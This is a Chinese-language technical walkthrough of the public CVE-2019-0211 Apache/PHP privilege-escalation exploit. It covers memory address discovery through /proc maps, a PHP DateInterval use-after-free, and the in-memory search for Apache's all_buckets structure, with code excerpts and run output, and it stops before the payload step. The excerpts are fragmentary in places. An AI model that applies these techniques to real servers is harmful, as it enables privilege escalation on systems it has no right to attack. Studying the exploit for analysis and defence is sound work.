###  具体实现
[EXP源码](https://github.com/cfreal/exploits/blob/master/CVE-2019-0211-apache/cfreal-carpediem.php)
####  概述
  * get_all_addresses 函数获取漏洞利用需要的内存地址
  * get_workers_pids 函数获取当前系统的所以worker进程的pid
  * class Z实现了JsonSerializable接口的jsonSerialize函数
  * real函数通过创建class Z 对象$y并调用json_encode执行class Z的jsonSerialize函数
     &$y]);
    }
    class Z implements JsonSerializable
    {
      public function jsonSerialize()
      {
        ...
      }
      ... 
    }  
    function get_all_addresses()
    {
      ...  
    }  
    function get_workers_pids()
    {
      ...  
    }  
    $addresses = get_all_addresses();
    $workers_pids = get_workers_pids();
    real();
####  工具函数说明
#####  str2ptr
可以简单理解为读取一个指针$str偏移$p处的8个字节的ulong
     no string allocation
        print($msg);
        print("n");
    }
    function str2ptr(&$str, $p, $s=8)
    {
        $address = 0;
        for($j=$s-1;$j>=0;$j--)
        {
            $address   
     /*
    0x38
    0x37
    0x36
    0x35
    0x34
    0x33
    0x32
    0x31
    0x3837363534333231
    >>> ord('8')
    56
    >>> hex(56)
    '0x38'
    */
    /*
    0x0
    0x0
    0x38
    0x37
    0x36
    0x35
    0x34
    0x33
    0x383736353433
    */
#####  ptr2str
主要用于创建一个$m字节的zend_string(zend_string.len = $m)
    >= 8;
        }
        return $out;
    }
    $_protector = ptr2str(0, 78);
    print($_protector . " " . strlen($_protector) . "n");
    echo ptr2str(0x616263);
    ?>
    /*
     78
    cba
    */
#####  find_symbol
根据动态库文件中库函数的偏移，计算当前进程内存空间中对应库函数的内存地址
#####  get_all_addresses
获取了下面这些地址：
1.大小在0x10000 ～ 0x16000 之间的worker进程shm地址范围，保存到$addresses[‘shm’]
原理：
    # cat /proc/44875/maps |grep '/dev/zero'  
    7fefaaed9000-7fefb2ed9000 rw-s 00000000 00:01 385061                     /dev/zero (deleted)
    7fefc1116000-7fefc112a000 rw-s 00000000 00:01 235954                     /dev/zero (deleted)
    $addresses['shm'] -> [7fefc1116000, 7fefc112a000]
作用：
  * worker进程的process_score(ap_scoreboard_image.parent[i])存放的位置
  * 堆喷射的内存区域(SHM 的空闲区域)
2.`libc-*.so`的加载地址，计算根据偏移system函数地址，保存到`$addresses['system']`
原理：
同样通过/proc/pid/maps获取`libc-*.so`的绝对路径，然后从.so文件中定位system函数的偏移，进而计算它在内存中的地址
作用: 最后任意函数调用的目标函数
3.获取libapr-1.so的可执行区域和只读区域的内存加载地址范围，保存到`$addresses['libaprX']`和`$addresses['libaprR']`
原理：同样，通过/proc/pid/maps匹配字符串获取
    # cat /proc/44875/maps |grep libapr-1.so | grep r-xp
    7fefc096a000-7fefc099d000 r-xp 00000000 08:01 2113254                    /usr/lib/x86_64-linux-gnu/libapr-1.so.0.6.3
    # cat /proc/44875/maps |grep libapr-1.so | grep r--p
    7fefc0b9d000-7fefc0b9e000 r--p 00033000 08:01 2113254                    /usr/lib/x86_64-linux-gnu/libapr-1.so.0.6.3
作用：用于定位all_buckets
4.获取Apache进程的内存区域 $addresses[‘apache’]
    # cat /proc/44875/maps |grep rw-p  |grep -v /lib
    # cat /proc/44875/maps |grep rwxp  |grep -v /lib
作用：用于定位all_buckets
5.获取`libphp*.so`加载地址和路径，通过zend_object_std_dtor的偏移计算其加载地址，保存到$addresses[‘zend_object_std_dtor’]
作用：作为任意函数执行的跳板函数
完整的地址获取结果：
    PID: 44874 
    Fetching addresses 
        zend_object_std_dtor: 0x7fefbd49c120 
        system: 0x7fefc03a9440 
        libaprX: 0x7fefc096a000-0x7fefc099d000 
        libaprR: 0x7fefc0b9d000-0x7fefc0b9e000 
        shm: 0x7fefc1116000-0x7fefc112a000 
        apache: 0x7fefc1168000-0x7fefc1263000
#####  get_workers_pids
获取当前用户权限的所有worker的PID
####  核心函数说明
real通过class Z的jsonSerialize函数完成漏洞利用的核心逻辑
1.通过PHP UAF获取对worker进程内存的读写能力
    class Z implements JsonSerializable
    {
        public function jsonSerialize()
        {
            global $y, $addresses, $workers_pids;
            $contiguous = [];
            for($i=0;$iabc = ptr2str(0, 79);
            $p = new DateInterval('PT1S');
            unset($y[0]);
            unset($p);
            $protector = ".$_protector";
            $x = new DateInterval('PT1S');
            $x->y = 0x00;
            # zend_string.len
            $x->d = 0x100;
            # zend_string.val[0-4]
            $x->h = 0x13121110;
            if(!(
                strlen($this->abc) === $x->d &&
                $this->abc[0] == "x10" &&
                $this->abc[1] == "x11" &&
                $this->abc[2] == "x12" &&
                $this->abc[3] == "x13"
            ))
            {
                o('UAF failed, exiting.');
                exit();
            }
            o('UAF successful.');
            o('');
            unset($room);
            $address = str2ptr($this->abc, 0x70 * 2 - 24);
            $address = $address - 0x70 * 3;
            $address = $address + 24;
            $distance = 
                max($addresses['apache'][1], $addresses['shm'][1]) -                $address
            ;
            $x->d = $distance;
            ...
    }
unset释放内存之前的堆内存布局：
这一步完成之后，后面就下面的方式访问任意内存了:  
写入一个字节到$mem_addr:
    $this->abc[$mem_addr - $address] = 'x';
从$mem_addr读取一个地址：
     str2ptr($this->abc, $mem_addr - $address);
2.通过特征定位all_buckets结构体
原理：all_buckets是worker进程的静态变量，所以遍历worker进程内存区域的每个8字节地址，根据all_buckets的结构，匹配指针所在区域，来定位all_buckets结构体。具体做了哪些匹配见下面代码和注释。
    class Z implements JsonSerializable
    {
        public function jsonSerialize()
        {
          ...
          # mutex在all_buckets结构体中的偏移是0x10
          # |all_buckets, mutex| = 0x10 
          # meth在mutex结构体中的偏移是0x08
          # |mutex, meth| = 0x8 
          # all_buckets is in apache's memory region
          # mutex is in apache's memory region
          # meth is in libaprR's memory region
          # meth's function pointers are in libaprX's memory region
          o('Looking for all_buckets in memory');
          $all_buckets = 0;
          for(
            $i = $addresses['apache'][0] + 0x10;
            $i mutex是否在apache内存区域
            $mutex = $pointer = str2ptr($this->abc, $i - $address);
            if(!in($pointer, $addresses['apache']))
              continue;
            # meth
            # 判断all_buckets->mutex->meth是否在libaprR内存区域
            $meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);
            if(!in($pointer, $addresses['libaprR']))
              continue;
          ...
            # meth->*
            # flags
            # 判断all_buckets->mutex->meth->flags是否为0
            if(str2ptr($this->abc, $pointer - $address) != 0)
              continue;
            # methods
            # 判断all_buckets->mutex->meth->*的各个函数指针是否在libaprX区域
            for($j=0;$jabc, $pointer + 0x8 + $j * 8 - $address);
              if(!in($m, $addresses['libaprX']))
                continue 2;
              o('        [*]: 0x' . dechex($m));
            }
            # $i的地址是all_buckets->mutext的地址，所以all_buckets地址是$i-0x10
            $all_buckets = $i - 0x10;
            o('all_buckets = 0x' . dechex($all_buckets));
            break;
          }
          ...
       }
    }
httpd-2.4.38/server/mpm/prefork/prefork.c
    typedef struct prefork_child_bucket {
        ap_pod_t *pod;
        ap_listen_rec *listeners;
        apr_proc_mutex_t *mutex;
    } prefork_child_bucket;
    static prefork_child_bucket *all_buckets, /* All listeners buckets */
                                *my_bucket;   /* Current child bucket */
apr/include/arch/unix/apr_arch_proc_mutex.h
    struct apr_proc_mutex_t {
        apr_pool_t *pool;
        const apr_proc_mutex_unix_lock_methods_t *meth;
        ...
    }
    struct apr_proc_mutex_unix_lock_methods_t {
        unsigned int flags;
        apr_status_t (*create)(apr_proc_mutex_t *, const char *);
        apr_status_t (*acquire)(apr_proc_mutex_t *);
        apr_status_t (*tryacquire)(apr_proc_mutex_t *);
        apr_status_t (*timedacquire)(apr_proc_mutex_t *, apr_interval_time_t);
        apr_status_t (*release)(apr_proc_mutex_t *);
        apr_status_t (*cleanup)(void *);
        apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *);
        apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);
        apr_lockmech_e mech;
        const char *name;
    };
可以通过这个脚本来测试：  
链接: 密码:2e67
运行：
    $ curl localhost/find_all_bkts.php
    PID: 29123
    Fetching addresses
      zend_object_std_dtor: 0x7fe7f1cbafb0
      system: 0x7fe7f4ba7440
      libaprX: 0x7fe7f5168000-0x0x7fe7f519b000
      libaprR: 0x7fe7f539b000-0x0x7fe7f539c000
      shm: 0x7fe7f5939000-0x0x7fe7f594d000
      apache: 0x7fe7f597e000-0x0x7fe7f5a61000
    Triggering UAF
      Creating room and filling empty spaces
      Allocating $abc and $p
      Unsetting both variables and setting $protector
      Creating DateInterval object
    UAF successful.
    Address of $abc: 0x7fe7ed0904e8
    Looking for all_buckets in memory
      [&mutex]: 0x7fe7f59fc1e0
        [mutex]: 0x7fe7f59fc330
          [meth]: 0x7fe7f539bb60
            [*]: 0x7fe7f51830d0
            [*]: 0x7fe7f5183070
            [*]: 0x7fe7f5183010
            [*]: 0x7fe7f5182fb0
            [*]: 0x7fe7f5182b30
            [*]: 0x7fe7f5182810
            [*]: 0x7fe7f5182f40
    all_buckets = 0x7fe7f59fc1d0
    root# gdb attach 29123
    gdb-peda$ p all_buckets 
    $1 = (prefork_child_bucket *) 0x7fe7f59fc1d0
3.构造和部署payload  